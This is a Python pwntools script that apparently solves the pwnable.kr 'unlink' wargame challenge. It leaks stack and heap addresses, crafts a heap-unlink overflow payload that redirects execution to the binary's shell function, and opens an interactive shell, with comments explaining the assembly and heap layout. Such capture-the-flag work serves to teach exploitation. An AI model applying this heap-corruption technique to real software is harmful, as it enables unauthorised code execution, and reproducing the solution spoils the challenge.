from pwn import *

# connect
shell = ssh("unlink", "pwnable.kr", 2222, "guest")
proc = shell.process(["./unlink"])
addr_shell = proc.elf.symbols["shell"]

proc.close()
proc = shell.process(["./unlink", p32(addr_shell)])

# receive address
proc.recvuntil("here is stack address leak: ")
addr_stack = int(proc.recvline(), 16)
log.success("Get A's stack address: " + hex(addr_stack))

proc.recvuntil("here is heap address leak: ")
addr_heap = int(proc.recvline(), 16)
log.success("Get A's heap  address: " + hex(addr_heap))

# send data
"""
   0x080485ff <+208>:   mov    ecx,DWORD PTR [ebp-0x4]
                               ecx = A
   0x08048602 <+211>:   leave
   0x08048603 <+212>:   lea    esp,[ecx-0x4]
                               esp = A->fd
   0x08048606 <+215>:   ret

unlink:
   A->fd = B->fd
   B->fd = shell()'s address, using overflow

heap:
   ----------------------------------
   | A's addr | B's addr | C's addr |  
"""

#payload  = p32(addr_shell)        # A's buf[0~3]
#payload += "A"*4                  # A's buf[4~7]
payload  = "A"*4                  # A's buf[0~3]
payload += p32(addr_shell)        # A's buf[4~7]
payload += "B"*4                  # B's prev_size
payload += "C"*4                  # B's size
#payload += p32(addr_heap  + 16)   # B->fd = gets()'s arguments
payload += p32(addr_stack + 8)
payload += p32(addr_stack + 0x10) # B's bk

# send payload
proc.sendline(payload)
proc.interactive()

# disconnect
proc.close()
shell.close()
